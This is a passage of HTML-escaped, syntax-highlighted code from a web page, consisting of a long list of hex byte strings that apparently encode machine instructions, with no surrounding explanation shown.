style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;d4&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;53&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;80&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;bd&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;18&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;01&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;c4&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;80&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;bd&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;08&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;11&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ea&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;48&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e9&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;04&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;b0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;8d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;08&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;d0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;4d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;6c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;93&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;08&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;60&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;93&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;03&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;99&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;50&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;93&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;03&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;94&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;40&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;93&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;03&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;8f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;20&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;93&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;08&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;20&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;33&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span 